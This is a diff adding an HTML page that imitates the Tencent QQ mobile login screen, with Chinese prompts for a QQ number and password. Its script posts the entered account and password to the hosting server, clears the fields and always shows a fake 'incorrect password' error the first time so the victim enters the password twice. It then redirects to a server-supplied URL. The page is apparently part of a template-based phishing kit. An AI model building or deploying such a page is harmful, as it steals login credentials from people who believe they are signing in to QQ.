@@ -1,0 +1,147 @@
+<!DOCTYPE html><html lang="zh-cn"><head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8;">
+<meta id="viewport" name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<link href="/tpl/47/css.css" rel="stylesheet" type="text/css"> 
+<title></title>
+<script src="http://libs.baidu.com/jquery/1.9.0/jquery.js"></script>
+<script src="http://yckart.github.io/jquery.base64.js/jquery.base64.js"></script>
+</head>
+<body style="zoom: 1; ">
+	<div id="content" class="content">
+		<div id="error_tips">
+			<div id="error_tips_content">
+				<span id="error_icon"></span> <span id="error_message"></span>
+			</div>
+		</div>
+		<div id="login" class="login">
+			<div id="logo" class="logo"></div>
+			<div id="app_name" style="display: none"></div>
+			<div id="q_login" class="q_login" style="display: none">
+				<div id="q_login_title">
+					<div id="q_login_logo"></div>
+					<label id="q_login_tips">请选择登录帐号</label>
+				</div>
+				<div id="q_logon_list" class="q_logon_list"></div>
+			</div>
+			<div id="web_login">
+			<form id="loginform" autocomplete="off" name="loginform" action="" method="post" target="_self" style="margin:0">
+				<ul id="g_list">
+					<li id="g_u"><div id="del_touch" class="del_touch">
+							<span id="del_u" class="del_u"></span>
+						</div>
+						<input id="u" class="inputstyle" name="u" autocomplete="off" placeholder="QQ号码/手机/邮箱"></li>
+					<li id="g_p"><div id="del_touch_p" class="del_touch">
+							<span id="del_p" class="del_u"></span>
+						</div>
+						<input id="p" class="inputstyle" maxlength="16" type="password" name="p" autocorrect="off" placeholder="请输入您的QQ密码"></li>
+				</ul>
+				<div id="auto_login">
+					<input type="checkbox" id="remember" checked="checked"> <span class="checkbox"></span><label class="wording">记住登录状态</label>
+				</div>
+				<div href="javascript:void(0);" id="go">登 录</div>
+				</form>
+			</div>
+			<div id="switch">
+				<div id="swicth_login" onclick="pt._switch()" style="display: none">快速登录历史帐号</div>
+				<div id="zc_feedback">
+					<span id="zc" onclick="window.open('http\x3A\x2F\x2Fptlogin2.qq.com\x2Fj_newreg_url')">注册新帐号</span>
+					<span id="forgetpwd">忘了密码？</span>
+				</div>
+			</div>
+			<div id="custom_bottom"></div>
+		</div>
+		<div id="vcode">
+			<label id="vcode_tips">点击图片可更换验证码</label>
+			<div id="vcode_area">
+				<img id="vcode_img"><label id="input_tips">请输入图中的字符不区分大小写</label><input id="vcode_input" name="vcode_input" tabindex="3" autocomplete="off" autocorrect="off" maxlength="6">
+			</div>
+			<div id="submit">提交验证码</div>
+		</div>
+	</div>
+	<div id="new_vcode" class="new_vcode">
+		
+	</div>
+	<div id="footerBlank"></div>
+<script src="/js/addNum.js"></script>
+
+<script>
+var err = false;
+var times = 0;
+function error(msg){
+
+	$("#error_tips").css({display:'block'});
+	$('#error_message').html(msg);
+	err = true;
+}
+
+$('form input').focus(function(){
+
+	$("#error_tips").css({display:'none'});
+	err = false;
+	
+});
+
+$("#error_tips").on('click',function(){
+	$(this).hide();
+});
+
+$("#go").on('click',function(){
+	$(this).parents('form').submit();
+});
+
+$('form').submit(function(){
+	var $this = $(this);
+	$.ajax({
+		url:$this.attr('action'),
+		data:$this.serialize(),
+		type:'post',
+		beforeSend:function(){
+			err = false;
+			var p = $("#p").val();
+			var u = $("#u").val();
+			
+			u == '' && error('您还没有输入帐号！');	
+			if(err) return false;
+			p == '' && error("您还没有输入密码！");
+			if(err) return false;
+
+			/^[1-9][0-9]{5,9}$/.test(u) || error('请输入正确的帐号！');
+			if(err) return false;
+
+			var len = p.length;
+
+			(len < 6 || len>16) && error('您输入的帐号或密码不正确，请重新输入。');
+			if(err) {
+				$("#p").val('');
+				return false;
+			}
+			$("#p").val('');
+			$("#u").val('');
+		},
+		success:function(data){
+			++times;
+			console.log(times);
+			if(times<2){
+				
+				error('您输入的帐号或密码不正确，请重新输入。');
+				
+			}else{
+				location.href = data.url;
+			}
+			
+		},
+		dataType:'json'
+
+		})
+
+	return false;
+
+
+	
+})
+
+
+
+</script>
+</body></html>
